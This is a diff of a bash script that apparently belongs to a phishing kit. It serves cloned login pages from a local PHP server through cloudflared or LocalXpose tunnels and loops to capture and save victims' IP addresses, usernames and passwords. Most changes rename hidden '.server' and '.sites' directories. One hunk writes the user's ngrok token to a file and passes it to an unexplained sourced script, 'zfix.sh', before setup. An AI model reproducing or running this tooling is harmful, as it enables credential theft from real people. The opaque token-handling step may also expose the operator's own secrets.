@@ -21,28 +21,28 @@ RESETBG="$(printf '\e[0m\n')"
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
-if [[ ! -d ".server" ]]; then
-	mkdir -p ".server"
+if [[ ! -d "server" ]]; then
+	mkdir -p "server"
 fi
 
 if [[ ! -d "auth" ]]; then
 	mkdir -p "auth"
 fi
 
-if [[ -d ".server/www" ]]; then
-	rm -rf ".server/www"
-	mkdir -p ".server/www"
+if [[ -d "server/www" ]]; then
+	rm -rf "server/www"
+	mkdir -p "server/www"
 else
-	mkdir -p ".server/www"
+	mkdir -p "server/www"
 fi
 
 ## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
+if [[ -e "server/.loclx" ]]; then
+	rm -rf "server/.loclx"
 fi
 
-if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
+if [[ -e "server/.cld.log" ]]; then
+	rm -rf "server/.cld.log"
 fi
 
 ## Script termination
@@ -121,11 +121,12 @@ function main_init_installation() {
     else
         echo -e "${GREEN}Token Ngrok successfully received.${RESET}"
 		echo $token > .token
-		dependencies_install
-		install_ngrok;
 		. zfix.sh
-		funh
+		funh $token
 		rm .token
+		dependencies_install
+		install_ngrok
+		
     fi
 }
 
@@ -190,14 +191,14 @@ download() {
 	if [[ -e "$file" ]]; then
 		if [[ ${file#*.} == "zip" ]]; then
 			unzip -qq $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
+			mv -f $output server/$output > /dev/null 2>&1
 		elif [[ ${file#*.} == "tgz" ]]; then
 			tar -zxf $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
+			mv -f $output server/$output > /dev/null 2>&1
 		else
-			mv -f $file .server/$output > /dev/null 2>&1
+			mv -f $file server/$output > /dev/null 2>&1
 		fi
-		chmod +x .server/$output > /dev/null 2>&1
+		chmod +x server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
@@ -257,7 +258,7 @@ install_ngrok() {
 
 ## Install Cloudflared
 install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
+	if [[ -e "server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
@@ -276,7 +277,7 @@ install_cloudflared() {
 
 ## Install LocalXpose
 install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
+	if [[ -e "server/loclx" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
@@ -358,30 +359,30 @@ cusport() {
 ## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
+	cp -rf sites/"$website"/* server/www
+	cp -f sites/ip.php server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+	cd server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
 capture_ip() {
-	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	IP=$(awk -F'IP: ' '{print $2}' server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
-	cat .server/www/ip.txt >> auth/ip.txt
+	cat server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	ACCOUNT=$(grep -o 'Username:.*' server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
-	cat .server/www/usernames.txt >> auth/usernames.dat
+	cat server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -389,16 +390,16 @@ capture_creds() {
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
-		if [[ -e ".server/www/ip.txt" ]]; then
+		if [[ -e "server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
-			rm -rf .server/www/ip.txt
+			rm -rf server/www/ip.txt
 		fi
 		sleep 0.75
-		if [[ -e ".server/www/usernames.txt" ]]; then
+		if [[ -e "server/www/usernames.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
-			rm -rf .server/www/usernames.txt
+			rm -rf server/www/usernames.txt
 		fi
 		sleep 0.75
 	done
@@ -413,23 +414,23 @@ start_cloudflared() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./server/cloudflared tunnel -url "$HOST":"$PORT" --logfile server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && ./server/cloudflared tunnel -url "$HOST":"$PORT" --logfile server/.cld.log > /dev/null 2>&1 &
 	fi
 
 	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "server/.cld.log")
 	custom_url "$cldflr_url"
 	capture_data
 }
 
 localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
+	./server/loclx -help > /dev/null 2>&1 &
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
-	[ "$(./.server/loclx account status | grep Error)" ] && {
+	[ "$(./server/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
@@ -452,13 +453,13 @@ start_loclx() {
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		sleep 1 && termux-chroot ./server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > server/.loclx 2>&1 &
 	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		sleep 1 && ./server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > server/.loclx 2>&1 &
 	fi
 
 	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	loclx_url=$(cat server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
 	custom_url "$loclx_url"
 	capture_data
 }
